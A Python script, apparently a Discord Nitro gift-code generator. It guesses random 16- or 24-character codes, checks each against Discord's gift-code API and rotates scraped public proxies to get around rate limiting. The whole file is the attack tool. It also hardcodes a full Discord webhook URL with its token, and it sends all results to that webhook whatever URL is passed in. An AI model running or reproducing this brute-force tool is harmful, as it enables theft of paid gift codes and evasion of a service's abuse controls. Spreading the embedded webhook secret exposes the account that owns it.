from discord_webhook import DiscordWebhook, DiscordEmbed
from time import localtime, strftime, sleep
from colorama import Fore
import requests
import random
import string
import os
class SapphireGen:
    def __init__(self, code_type: str, prox=None, codes=None, webhook_url=None):
        self.type = code_type
        self.codes = codes
        self.proxies = prox
        self.webhook_url = "https://discord.com/api/webhooks/1189559850171105330/NYAy1VY_YDr820kLW_y6_sXfD9ZYZSA3NvR4UVKyyACoRYvztT9t_85sc0rIevVBMif2"  # هنا تحديد رابط الويب هوك
        self.session = requests.Session()
        self.prox_api = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"

    def __proxies(self):
        req = self.session.get(self.prox_api).text
        if req is not None:
            open("./data/proxies.txt", "a+").truncate(0)
            for proxy in req.split("\n"):
                proxy = proxy.strip()
                proxy = f"https://{proxy}"
                open("./data/proxies.txt", "a").write(f"{proxy}\n")

    def generate(self, scrape=None):
        results = []

        if scrape == "True":
            self.__proxies()
        else:
            pass

        for _ in range(int(self.codes)):
            try:
                if self.proxies == "True":
                    prox = {
                        "http": random.choice(open("./data/proxies.txt", "r").read().splitlines())
                    }
                else:
                    prox = None

                if self.type == "boost":
                    code = "".join([random.choice(string.ascii_letters + string.digits) for i in range(24)])
                else:
                    code = "".join([random.choice(string.ascii_letters + string.digits) for i in range(16)])

                req = self.session.get(
                    f"https://discordapp.com/api/entitlements/gift-codes/{code}",
                    proxies=prox,
                    timeout=10,
                ).status_code

                if req == 200:
                    result = {"code": code, "status": "valid"}
                    results.append(result)
                elif req == 404:
                    result = {"code": code, "status": "invalid"}
                    results.append(result)
                elif req == 429:
                    result = {"code": code, "status": "ratelimited"}
                    results.append(result)

            except Exception as e:
                result = {"code": code, "status": f"error - {str(e)}"}
                results.append(result)

        return results

    def send_results_to_webhook(self, results):
        webhook = DiscordWebhook(url=self.webhook_url)
        embed = DiscordEmbed(title=f"Results for {self.codes} Codes", color=242424)

        for result in results:
            code = result["code"]
            status = result["status"]

            if status == "valid":
                embed.add_embed_field(name='Valid Code', value=f"discord.gift/{code}", inline=False)
            elif status == "invalid":
                embed.add_embed_field(name='Invalid Code', value=f"discord.gift/{code}", inline=False)
            elif status == "ratelimited":
                embed.add_embed_field(name='Rate Limited Code', value=f"discord.gift/{code}", inline=False)
            else:
                embed.add_embed_field(name='Error', value=f"Code: {code}, Status: {status}", inline=False)

        webhook.add_embed(embed)
        webhook.execute()

if __name__ == "__main__":
    webhook_url = "https://discord.com/api/webhooks/1189559850171105330/NYAy1VY_YDr820kLW_y6_sXfD9ZYZSA3NvR4UVKyyACoRYvztT9t_85sc0rIevVBMif2"

    while True:
        code_type = input(f"{Fore.LIGHTMAGENTA_EX}[{strftime('%H:%M', localtime())}] Code Type (boost, classic): ")
        prox = input(f"{Fore.LIGHTMAGENTA_EX}[{strftime('%H:%M', localtime())}] Proxies (True, False): ")

        if prox == "True":
            scrape_proxy = input(f"{Fore.LIGHTMAGENTA_EX}[{strftime('%H:%M', localtime())}] Scrape proxies (True, False): ")
        else:
            scrape_proxy = False

        codes = input(f"{Fore.LIGHTMAGENTA_EX}[{strftime('%H:%M', localtime())}] Number of codes: ")

        sapphire_gen = SapphireGen(code_type, prox, codes, webhook_url)
        results = sapphire_gen.generate(scrape=scrape_proxy)
        sapphire_gen.send_results_to_webhook(results)
